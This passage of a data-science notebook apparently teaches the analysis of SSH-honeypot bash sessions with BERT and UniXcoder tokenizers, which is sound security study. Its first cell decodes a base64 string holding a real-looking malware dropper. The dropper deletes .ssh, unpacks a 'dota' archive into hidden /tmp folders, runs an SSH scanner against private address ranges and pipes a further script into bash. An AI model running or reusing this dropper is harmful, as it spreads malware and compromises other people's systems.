      "source": [
        "import base64\n",
        "b64string = 'IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKbWtkaXIgLlgxMy11bml4CmNkIC5YMTMtdW5peAptdiAvdmFyL3RtcC9kb3RhLnRhci5neiBkb3RhLnRhci5negp0YXIgeGYgZG90YS50YXIuZ3oKc2xlZXAgM3MgJiYgY2QgL3RtcC8uWDEzLXVuaXgvLnJzeW5jL2MKbm9odXAgL3RtcC8uWDEzLXVuaXgvLnJzeW5jL2MvdHNtIC10IDE1MCAtUyA2IC1zIDYgLXAgMjIgLVAgMCAtZiAwIC1rIDEgLWwgMSAtaSAwIC90bXAvdXAudHh0IDE3Mi4xNiA+PiAvZGV2L251bGwgMj4xJgpzbGVlcCA4bTsgbm9odXAgL3RtcC8uWDEzLXVuaXgvLnJzeW5jL2MvdHNtIC10IDE1MCAtUyA2IC1zIDYgLXAgMjIgLVAgMCAtZiAwIC1rIDEgLWwgMSAtaSAwIC90bXAvdXAudHh0IDE5Mi4xNjggPj4gL2Rldi9udWxsIDI+MSYKc2xlZXAgMjBtICYmIGNkIC90bXAvLlgxMy11bml4LyAmJiBjYXQgL3RtcC8uWDEzLXVuaXgvLnJzeW5jL2luaXRhbGwgfCBiYXNoIDI+MSYKZXhpdCAw'\n",
        "print(base64.b64decode(b64string).decode('utf-8'))\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "IipjIPqG3Cma"
      },
      "source": [
        "The first `echo` is changing the root password, which is a classic Persistence action on a system. The second one, instead, is a blob of base64-encoded commands that are executed in a pipe by a bash command (`| base64 --decode | bash`)."
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "jf_VU2Y63Cmb"
      },
      "source": [
        "- **Explore the Bash words**: How many Bash words per session do you have? Plot the Es-\n",
        "timated Cumulative Distribution Function (ECDF)5 – example in the sample notebooks."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 487
        },
        "id": "bgaVB85A3Cmb",
        "outputId": "58647206-2859-4a4b-8571-c99f1a2b9626"
      },
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<Figure size 800x500 with 1 Axes>"
            ],
            "image/png": "[encoded data removed]"
          },
          "metadata": {}
        }
      ],
      "source": [
        "def session_length(df):\n",
        "    return df['session'].str.split(\" \").apply(len)\n",
        "\n",
        "train_lengths = session_length(train_data)\n",
        "test_lengths = session_length(test_data)\n",
        "\n",
        "# ECDF function\n",
        "def plot_ecdf(data, label):\n",
        "    x = np.sort(data)\n",
        "    y = np.arange(1, len(x)+1) / len(x)\n",
        "    plt.plot(x, y, \".-\", label=label,)\n",
        "\n",
        "plt.figure(figsize=(8, 5))\n",
        "plot_ecdf(train_lengths, \"Train\")\n",
        "plot_ecdf(test_lengths, \"Test\")\n",
        "plt.xlabel(\"Bash Words per Session\")\n",
        "plt.ylabel(\"ECDF\")\n",
        "plt.title(\"ECDF of Session Lengths\")\n",
        "plt.legend()\n",
        "plt.grid()\n",
        "plt.show()"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "_zB1ylfD3Cmc",
        "outputId": "4684cc13-07d8-43a7-95c6-740d87a84bb8"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Train set: 0 rows where session and label lengths don't match.\n",
            "No mismatches found in train set.\n",
            "Test set: 0 rows where session and label lengths don't match.\n",
            "No mismatches found in test set.\n"
          ]
        }
      ],
      "source": [
        "# For Train set\n",
        "mask_train = train_data['session'].str.split(\" \").str.len() != train_data['label'].str.len()\n",
        "cardinality_train = mask_train.sum()\n",
        "print(f\"Train set: {cardinality_train} rows where session and label lengths don't match.\")\n",
        "\n",
        "if mask_train.any():\n",
        "    mismatches = train_data[mask_train].copy()\n",
        "    mismatches['session_len'] = mismatches['session'].str.split(\" \").str.len()\n",
        "    mismatches['label_len'] = mismatches['label'].str.len()\n",
        "    display(mismatches[['session', 'label', 'session_len', 'label_len']])\n",
        "else:\n",
        "    print(\"No mismatches found in train set.\")\n",
        "\n",
        "# For Test set\n",
        "mask_test = test_data['session'].str.split(\" \").str.len() != test_data['label'].str.len()\n",
        "cardinality_test = mask_test.sum()\n",
        "print(f\"Test set: {cardinality_test} rows where session and label lengths don't match.\")\n",
        "\n",
        "if mask_test.any():\n",
        "    mismatches = test_data[mask_test].copy()\n",
        "    mismatches['session_len'] = mismatches['session'].str.split(\" \").str.len()\n",
        "    mismatches['label_len'] = mismatches['label'].str.len()\n",
        "    display(mismatches[['session', 'label', 'session_len', 'label_len']])\n",
        "else:\n",
        "    print(\"No mismatches found in test set.\")\n",
        "\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "lC3K9QOI3Cmd"
      },
      "source": [
        "## Task 2: Tokenization\n",
        "- Load the tokenizers of the following 2 models: BERT-base (‘`bert-base-uncased`’) and Unixcoder-base (‘`microsoft/unixcoder-base`’).  \n",
        "    – *BERT-base (‘`bert-base-uncased`’)*: one of the first pre-trained models, in its base-size version (12 layers, 110M parameters). BERT was pre-trained only on English text. It is a Google general-purpose language model, widely used for NLP tasks such as classification, NER, and Question and Answering (QA).  \n",
        "    – *Unixcoder-base (‘`microsoft/unixcoder-base`’)*: is a base version of **UniXcoder**, a model developed by Microsoft for understanding and generating code. It is pre-trained on both natural language and source code (like Python, Java, Bash), and is designed for tasks such as code summarization, code search, and NL-to-code translation.  \n",
        "\n",
        "\n",
        "Tokenize the following list of SSH commands: [cat, shell, echo, top, chpasswd, crontab, wget, busybox and grep].  \n",
        "**Q**: How do tokenizers divide the commands into tokens? Does one of them have a better (lower) ratio between tokens and words? Why are some of the words held together by both tokenizers?  \n",
        "- Now tokenize the entire training corpus with both tokenizers.  \n",
        "**Q**: How many tokens does the BERT tokenizer generate on average? How many with the Unixcoder? Why do you think it is the case? What is the maximum number of tokens per bash session for both tokenizers?  \n",
        "- How many sessions would currently be truncated for each tokenizer (remember: you can determine the maximum context of a model with ‘tokenizer.model_max_length’)?  \n",
        "- Select the bash session that corresponds to the maximum number of tokens.  \n",
        "**Q**: How many bash words does it contain? Why do both tokenizers produce such a high number of tokens? Why does BERT produce fewer tokens than Unixcoder (Hint: does UnixCoder use the token ‘[UNK]’ ?).  \n",
        "- None of the tokenizers can process such long words6. One technique for dealing with such cases is to truncate long words. Therefore, truncate words longer than 30 characters (98% of words are shorter, so that is a safe margin). Re-tokenize the processed sessions.  \n",
        "**Q**: How many tokens per session do you have with the two tokenizers? Plot the number of words vs number of tokens for each tokenizer. Which of the two tokenizers has the best ratio of tokens to words?  \n",
        "- How many sessions now get truncated?  "
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 696,
          "referenced_widgets": [
            "8a82e3e2d87d441c94e6cf0ba70f0082",
            "d79b1a350a37481f97091195fb7fec6e",
            "c7e6f4a90d2f419dac26cf8653b9b6e3",
            "b1f41a846cd1461ab16d574860e73fec",
            "98c7e0b436494256a54d0ab57132c37c",
            "f6d2f4620d274402a1d7410467452067",
            "e4c3805b04e942ed86bc7bfc1865c0e2",
            "b4e4a57a3e3c449098aa27eb48951964",
            "1f88d28dfb794725803df20107774b2c",
            "220f077587f74fd3a78590f95984c763",
            "dadfbb529d8f4d4bbca34b1c4d82e800",
            "8e25fd2d4fcc407b817de237fa650472",
            "5f4fd0a5ad6c4c8495f3a660db45c275",
            "5bbdae5dd45f414e82b7669758888470",
            "dfac2a6bf9c54bb8af1c0e0ed1572585",
            "d3071dca9ad6476b92b15b4383547bfa",
            "22fd1f4e6752439aa7c43b0ac05cc286",
            "9444221194bc49a1819a51a3b5c470ab",
            "3dff9f09acf1410b9d7202703f5a34c7",
            "73541f750103489ca67940c002954a9e",
            "1ac29537e93e4c0b8f125e1fab82acf4",
            "3e73d2ef006940079adfdc8a3d1bf685",
            "80843eed558d404293927c172f071c03",
            "101b228391d04b62aacc42250773d4a5",
            "8825b1d09e824b37ad22917cc2ff5ec6",
            "1ba1a431d893476fb9c625f0f28005be",
            "6f299674b6d14ca9811d0af21faea352",
            "66e890cff9a04cd5b6d5c26dbc3c608b",
            "8ffc0f8ea228475a8846e74db310b5d7",
            "91932b0814954fa68d3da15bb79f15ba",
            "02d4531dff5f4c4697ef837834068006",
            "f3649c1c16f04a8a89e399850713fc45",
            "34ea0529fa434a0cb9bb7ff107af3168",
            "3782b02247764daf9e5ab27d4af0f370",
            "81675819f56e4a429e8474f2dff88b31",
            "dc4fbf5c96644643ac18db858819df6a",
            "4bda64865a7446218e5091ca30b78282",
            "f2faa1a487584e8bae746176b1b8c377",
            "e4085330f84a4a04b77ae3792818203e",
            "e1075243b2b94d409500b9aaaf7825c3",
            "41cb72d190ec46e5be198ffd8db3c19a",
            "ca3f76712a144146afbe0dadcc0d8b21",
            "c1c8a50b34f4464c9a67d7dabf1f8ddf",
            "747a553736574541a718f0c45e0bac9c",
            "e1a319a5854e419da38d54a6c2b81e10",
            "c94fd5fd09ab412e8d85cb39010d2e86",
            "99bdb7f8d1ff4243b6f8442a36c0856f",
            "2b47dbe8fa5b4ab68ed0749731ee87d9",
            "2f2a4a3620b245bfb874121fdfea9c9f",
            "5031f2cf1ec84bcfbd2fcc1211fc8628",
            "dbac62388b4b43309d49de8b63343920",
            "8b2d7536fce64ba2a28445f18cc97275",
            "a553ba1ed39e41a199849e529897366c",
            "797f0c5d53c040b094c10d5321593b23",
            "7cfc989e18fa48e88a176b7498934e00",
            "4a8455a8847440a1981d3cb672ff5eb0",
            "4a4fe569f3784d24becbbad26346cd0a",
            "76cd29ed94bd4266ba7e4c93fb0c3f8b",
            "164bf67e66554c67859d7073a3462f9c",
            "706fa27bed054b9e87d88e0116adf00e",
            "50812495b84c43089b8cc65881f41c3f",
            "27cc341529964f25b00a1feb0bfe50e7",
            "664cb81a7acd4706b349ea50b2775cd3",
            "be0ec1db41bd45b69643f9319bce76f2",
            "d71172a6e0674dce99a94ad560b94fe8",
            "42978c7653404c2f85ec8f474f12c5d6",
            "6fe04a9bfed9479b8cec994c92f63a74",
            "ba85f6eaa5e846bca52eed195751662d",
            "859cf0b865fc414680cf0f575bbd1a93",
            "bff59b722ad04defbd446092d6ceca1b",
            "859684e33cf146dc95a1ca900ff7a2bd",
            "5687c8f5096947268e2480324f48312c",
            "d6da3ec9eb4249f9be81d39522510c3f",
            "ed177cddc0374aa996bb24f350b5f4f9",
            "e931b275c1f34307a19468f17a117b26",
            "97eb5e15a17947a19ccce987122ece3c",
            "0205f32e19ef4a26b6304851003a7a5a",
            "34777e9a0f2c464584474a160908c89c",
            "fc981456535141ffaa39c9e6a5505c11",
            "950ed02f8dd940dfb47f01a0a00d719d",
            "224fd669e7b4492d9ea923692e0ce202",
            "5f9338e602024fc0a05261a1cc070bb0",
            "3e80fb9ea17a4b1c9ec70259f06e88e3",
            "1df196bff311468d8a89f62c7e74ddc8",
            "c9c3d25a5202436c944048f56468c0d6",
            "9ede264840914e49ba6dec4509b920cc",
            "2f5256cbb4a64cdaa41f34ede41f32fe",
            "535066a0aa3f4fd2849f67963acbe0fb"
          ]
        },
        "id": "wyQGXKFN3Cmd",
        "outputId": "5b0dc238-088b-44bd-832f-b95ab1b5b227"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "/usr/local/lib/python3.11/dist-packages/huggingface_hub/utils/_auth.py:94: UserWarning: \n",
            "The secret `HF_TOKEN` does not exist in your Colab secrets.\n",
            "To authenticate with the Hugging Face Hub, create a token in your settings tab (https://huggingface.co/settings/tokens), set it as secret in your Google Colab and restart your session.\n",
            "You will be able to reuse this secret in all of your notebooks.\n",
            "Please note that authentication is recommended but still optional to access public models or datasets.\n",
            "  warnings.warn(\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "tokenizer_config.json:   0%|          | 0.00/48.0 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "8a82e3e2d87d441c94e6cf0ba70f0082"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "config.json:   0%|          | 0.00/570 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "8e25fd2d4fcc407b817de237fa650472"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "vocab.txt:   0%|          | 0.00/232k [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "80843eed558d404293927c172f071c03"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "tokenizer.json:   0%|          | 0.00/466k [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "3782b02247764daf9e5ab27d4af0f370"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "tokenizer_config.json:   0%|          | 0.00/1.11k [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "e1a319a5854e419da38d54a6c2b81e10"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "vocab.json:   0%|          | 0.00/938k [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "4a8455a8847440a1981d3cb672ff5eb0"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "merges.txt:   0%|          | 0.00/444k [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "6fe04a9bfed9479b8cec994c92f63a74"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "special_tokens_map.json:   0%|          | 0.00/772 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "34777e9a0f2c464584474a160908c89c"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "    Command         BERT tokens  Num BERT tokens UniXcoder tokens  \\\n",
              "0       cat               [cat]                1            [cat]   \n",
              "1     shell             [shell]                1          [shell]   \n",
              "2      echo              [echo]                1           [echo]   \n",
              "3       top               [top]                1            [top]   \n",
              "4  chpasswd  [ch, ##pass, ##wd]                3     [ch, passwd]   \n",
              "5   crontab   [cr, ##ont, ##ab]                3    [cr, ont, ab]   \n",
              "6      wget          [w, ##get]                2         [w, get]   \n",
              "7   busybox       [busy, ##box]                2        [busybox]   \n",
              "8      grep          [gr, ##ep]                2           [grep]   \n",
              "\n",
              "   Num UniXcoder tokens  \n",
              "0                     1  \n",
              "1                     1  \n",
              "2                     1  \n",
              "3                     1  \n",
              "4                     2  \n",
              "5                     3  \n",
              "6                     2  \n",
              "7                     1  \n",
              "8                     1  "
            ],
            "text/html": [
              "\n",
              "  <div id=\"df-fd7ef571-cdad-4fc2-a33c-be7a930c1a28\" class=\"colab-df-container\">\n",
              "    <div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>Command</th>\n",
              "      <th>BERT tokens</th>\n",
              "      <th>Num BERT tokens</th>\n",
              "      <th>UniXcoder tokens</th>\n",
              "      <th>Num UniXcoder tokens</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>cat</td>\n",
              "      <td>[cat]</td>\n",
              "      <td>1</td>\n",
              "      <td>[cat]</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>shell</td>\n",
              "      <td>[shell]</td>\n",
              "      <td>1</td>\n",
              "      <td>[shell]</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>echo</td>\n",
              "      <td>[echo]</td>\n",
              "      <td>1</td>\n",
              "      <td>[echo]</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>top</td>\n",
              "      <td>[top]</td>\n",
              "      <td>1</td>\n",
              "      <td>[top]</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>chpasswd</td>\n",
              "      <td>[ch, ##pass, ##wd]</td>\n",
              "      <td>3</td>\n",
              "      <td>[ch, passwd]</td>\n",
              "      <td>2</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>5</th>\n",
              "      <td>crontab</td>\n",
              "      <td>[cr, ##ont, ##ab]</td>\n",
              "      <td>3</td>\n",
              "      <td>[cr, ont, ab]</td>\n",
              "      <td>3</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>6</th>\n",
              "      <td>wget</td>\n",
              "      <td>[w, ##get]</td>\n",
              "      <td>2</td>\n",
              "      <td>[w, get]</td>\n",
              "      <td>2</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>7</th>\n",
              "      <td>busybox</td>\n",
              "      <td>[busy, ##box]</td>\n",
              "      <td>2</td>\n",
              "      <td>[busybox]</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>8</th>\n",
              "      <td>grep</td>\n",
              "      <td>[gr, ##ep]</td>\n",
              "      <td>2</td>\n",
              "      <td>[grep]</td>\n",
              "      <td>1</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>\n",
              "    <div class=\"colab-df-buttons\">\n",
              "\n",
              "  <div class=\"colab-df-container\">\n",
              "    <button class=\"colab-df-convert\" onclick=\"convertToInteractive('df-fd7ef571-cdad-4fc2-a33c-be7a930c1a28')\"\n",
              "            title=\"Convert this dataframe to an interactive table.\"\n",
              "            style=\"display:none;\">\n",
              "\n",
              "  <svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\" viewBox=\"0 -960 960 960\">\n",
              "    <path d=\"M120-120v-720h720v720H120Zm60-500h600v-160H180v160Zm220 220h160v-160H400v160Zm0 220h160v-160H400v160ZM180-400h160v-160H180v160Zm440 0h160v-160H620v160ZM180-180h160v-160H180v160Zm440 0h160v-160H620v160Z\"/>\n",
              "  </svg>\n",
              "    </button>\n",
              "\n",
              "  <style>\n",
              "    .colab-df-container {\n",
              "      display:flex;\n",
              "      gap: 12px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert {\n",
              "      background-color: #E8F0FE;\n",
              "      border: none;\n",
              "      border-radius: 50%;\n",
              "      cursor: pointer;\n",
              "      display: none;\n",
              "      fill: #1967D2;\n",
              "      height: 32px;\n",
              "      padding: 0 0 0 0;\n",
              "      width: 32px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert:hover {\n",
              "      background-color: #E2EBFA;\n",
              "      box-shadow: 0px 1px 2px rgba(60, 64, 67, 0.3), 0px 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "      fill: #174EA6;\n",
              "    }\n",
              "\n",
              "    .colab-df-buttons div {\n",
              "      margin-bottom: 4px;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert {\n",
              "      background-color: #3B4455;\n",
              "      fill: #D2E3FC;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert:hover {\n",
              "      background-color: #434B5C;\n",
              "      box-shadow: 0px 1px 3px 1px rgba(0, 0, 0, 0.15);\n",
              "      filter: drop-shadow(0px 1px 2px rgba(0, 0, 0, 0.3));\n",
              "      fill: #FFFFFF;\n",
              "    }\n",
              "  </style>\n",
              "\n",
              "    <script>\n",
              "      const buttonEl =\n",
              "        document.querySelector('#df-fd7ef571-cdad-4fc2-a33c-be7a930c1a28 button.colab-df-convert');\n",
              "      buttonEl.style.display =\n",
              "        google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "\n",
              "      async function convertToInteractive(key) {\n",
              "        const element = document.querySelector('#df-fd7ef571-cdad-4fc2-a33c-be7a930c1a28');\n",
              "        const dataTable =\n",
              "          await google.colab.kernel.invokeFunction('convertToInteractive',\n",
              "                                                    [key], {});\n",
              "        if (!dataTable) return;\n",
              "\n",
              "        const docLinkHtml = 'Like what you see? Visit the ' +\n",
              "          '<a target=\"_blank\" href=https://colab.research.google.com/notebooks/data_table.ipynb>data table notebook</a>'\n",
              "          + ' to learn more about interactive tables.';\n",
              "        element.innerHTML = '';\n",
              "        dataTable['output_type'] = 'display_data';\n",
              "        await google.colab.output.renderOutput(dataTable, element);\n",
              "        const docLink = document.createElement('div');\n",
              "        docLink.innerHTML = docLinkHtml;\n",
              "        element.appendChild(docLink);\n",
              "      }\n",
              "    </script>\n",
              "  </div>\n",
              "\n",
              "\n",
              "    <div id=\"df-a7553921-a8b3-4c3f-956b-3d2400daba53\">\n",
              "      <button class=\"colab-df-quickchart\" onclick=\"quickchart('df-a7553921-a8b3-4c3f-956b-3d2400daba53')\"\n",
              "                title=\"Suggest charts\"\n",
              "                style=\"display:none;\">\n",
              "\n",
              "<svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\"viewBox=\"0 0 24 24\"\n",
              "     width=\"24px\">\n",
              "    <g>\n",
              "        <path d=\"M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zM9 17H7v-7h2v7zm4 0h-2V7h2v10zm4 0h-2v-4h2v4z\"/>\n",
              "    </g>\n",
              "</svg>\n",
              "      </button>\n",
              "\n",
              "<style>\n",
              "  .colab-df-quickchart {\n",
              "      --bg-color: #E8F0FE;\n",
              "      --fill-color: #1967D2;\n",
              "      --hover-bg-color: #E2EBFA;\n",
              "      --hover-fill-color: #174EA6;\n",
              "      --disabled-fill-color: #AAA;\n",
              "      --disabled-bg-color: #DDD;\n",
              "  }\n",
              "\n",
              "  [theme=dark] .colab-df-quickchart {\n",
              "      --bg-color: #3B4455;\n",
              "      --fill-color: #D2E3FC;\n",
              "      --hover-bg-color: #434B5C;\n",
              "      --hover-fill-color: #FFFFFF;\n",
              "      --disabled-bg-color: #3B4455;\n",
              "      --disabled-fill-color: #666;\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart {\n",
              "    background-color: var(--bg-color);\n",
              "    border: none;\n",
              "    border-radius: 50%;\n",
              "    cursor: pointer;\n",
              "    display: none;\n",
              "    fill: var(--fill-color);\n",
              "    height: 32px;\n",
              "    padding: 0;\n",
              "    width: 32px;\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart:hover {\n",
              "    background-color: var(--hover-bg-color);\n",
              "    box-shadow: 0 1px 2px rgba(60, 64, 67, 0.3), 0 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "    fill: var(--button-hover-fill-color);\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart-complete:disabled,\n",
              "  .colab-df-quickchart-complete:disabled:hover {\n",
              "    background-color: var(--disabled-bg-color);\n",
              "    fill: var(--disabled-fill-color);\n",
              "    box-shadow: none;\n",
              "  }\n",
              "\n",
              "  .colab-df-spinner {\n",
              "    border: 2px solid var(--fill-color);\n",
              "    border-color: transparent;\n",
              "    border-bottom-color: var(--fill-color);\n",
              "    animation:\n",
              "      spin 1s steps(1) infinite;\n",
              "  }\n",
              "\n",
              "  @keyframes spin {\n",
              "    0% {\n",
              "      border-color: transparent;\n",
              "      border-bottom-color: var(--fill-color);\n",
              "      border-left-color: var(--fill-color);\n",
              "    }\n",
              "    20% {\n",
              "      border-color: transparent;\n",
              "      border-left-color: var(--fill-color);\n",
              "      border-top-color: var(--fill-color);\n",
              "    }\n",
              "    30% {\n",
              "      border-color: transparent;\n",
              "      border-left-color: var(--fill-color);\n",
              "      border-top-color: var(--fill-color);\n",
              "      border-right-color: var(--fill-color);\n",
              "    }\n",
              "    40% {\n",
              "      border-color: transparent;\n",
              "      border-right-color: var(--fill-color);\n",
              "      border-top-color: var(--fill-color);\n",
              "    }\n",
              "    60% {\n",
              "      border-color: transparent;\n",
              "      border-right-color: var(--fill-color);\n",
              "    }\n",
              "    80% {\n",
              "      border-color: transparent;\n",
              "      border-right-color: var(--fill-color);\n",
              "      border-bottom-color: var(--fill-color);\n",
              "    }\n",
              "    90% {\n",
              "      border-color: transparent;\n",
              "      border-bottom-color: var(--fill-color);\n",
              "    }\n",
              "  }\n",
              "</style>\n",
              "\n",
              "      <script>\n",
              "        async function quickchart(key) {\n",
              "          const quickchartButtonEl =\n",
              "            document.querySelector('#' + key + ' button');\n",
              "          quickchartButtonEl.disabled = true;  // To prevent multiple clicks.\n",
              "          quickchartButtonEl.classList.add('colab-df-spinner');\n",
              "          try {\n",
              "            const charts = await google.colab.kernel.invokeFunction(\n",
              "                'suggestCharts', [key], {});\n",
              "          } catch (error) {\n",
              "            console.error('Error during call to suggestCharts:', error);\n",
              "          }\n",
              "          quickchartButtonEl.classList.remove('colab-df-spinner');\n",
              "          quickchartButtonEl.classList.add('colab-df-quickchart-complete');\n",
              "        }\n",
              "        (() => {\n",
              "          let quickchartButtonEl =\n",
              "            document.querySelector('#df-a7553921-a8b3-4c3f-956b-3d2400daba53 button');\n",
              "          quickchartButtonEl.style.display =\n",
              "            google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "        })();\n",
              "      </script>\n",
              "    </div>\n",
              "\n",
              "  <div id=\"id_4b1f17d1-4821-45b4-9c92-4e5dce81ff0d\">\n",
              "    <style>\n",
              "      .colab-df-generate {\n",
              "        background-color: #E8F0FE;\n",
              "        border: none;\n",
              "        border-radius: 50%;\n",
              "        cursor: pointer;\n",
              "        display: none;\n",
              "        fill: #1967D2;\n",
              "        height: 32px;\n",
              "        padding: 0 0 0 0;\n",
              "        width: 32px;\n",
              "      }\n",
              "\n",
              "      .colab-df-generate:hover {\n",
              "        background-color: #E2EBFA;\n",
              "        box-shadow: 0px 1px 2px rgba(60, 64, 67, 0.3), 0px 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "        fill: #174EA6;\n",
              "      }\n",
              "\n",
              "      [theme=dark] .colab-df-generate {\n",
              "        background-color: #3B4455;\n",
              "        fill: #D2E3FC;\n",
              "      }\n",
              "\n",
              "      [theme=dark] .colab-df-generate:hover {\n",
              "        background-color: #434B5C;\n",
              "        box-shadow: 0px 1px 3px 1px rgba(0, 0, 0, 0.15);\n",
              "        filter: drop-shadow(0px 1px 2px rgba(0, 0, 0, 0.3));\n",
              "        fill: #FFFFFF;\n",
              "      }\n",
              "    </style>\n",
              "    <button class=\"colab-df-generate\" onclick=\"generateWithVariable('df')\"\n",
              "            title=\"Generate code using this dataframe.\"\n",
              "            style=\"display:none;\">\n",
              "\n",
              "  <svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\"viewBox=\"0 0 24 24\"\n",
              "       width=\"24px\">\n",
              "    <path d=\"M7,19H8.4L18.45,9,17,7.55,7,17.6ZM5,21V16.75L18.45,3.32a2,2,0,0,1,2.83,0l1.4,1.43a1.91,1.91,0,0,1,.58,1.4,1.91,1.91,0,0,1-.58,1.4L9.25,21ZM18.45,9,17,7.55Zm-12,3A5.31,5.31,0,0,0,4.9,8.1,5.31,5.31,0,0,0,1,6.5,5.31,5.31,0,0,0,4.9,4.9,5.31,5.31,0,0,0,6.5,1,5.31,5.31,0,0,0,8.1,4.9,5.31,5.31,0,0,0,12,6.5,5.46,5.46,0,0,0,6.5,12Z\"/>\n",
              "  </svg>\n",
              "    </button>\n",
              "    <script>\n",
              "      (() => {\n",
              "      const buttonEl =\n",
              "        document.querySelector('#id_4b1f17d1-4821-45b4-9c92-4e5dce81ff0d button.colab-df-generate');\n",
              "      buttonEl.style.display =\n",
              "        google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "\n",
              "      buttonEl.onclick = () => {\n",
              "        google.colab.notebook.generateWithVariable('df');\n",
              "      }\n",
              "      })();\n",
              "    </script>\n",
              "  </div>\n",
              "\n",
              "    </div>\n",
              "  </div>\n"
            ],
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "dataframe",
              "variable_name": "df",
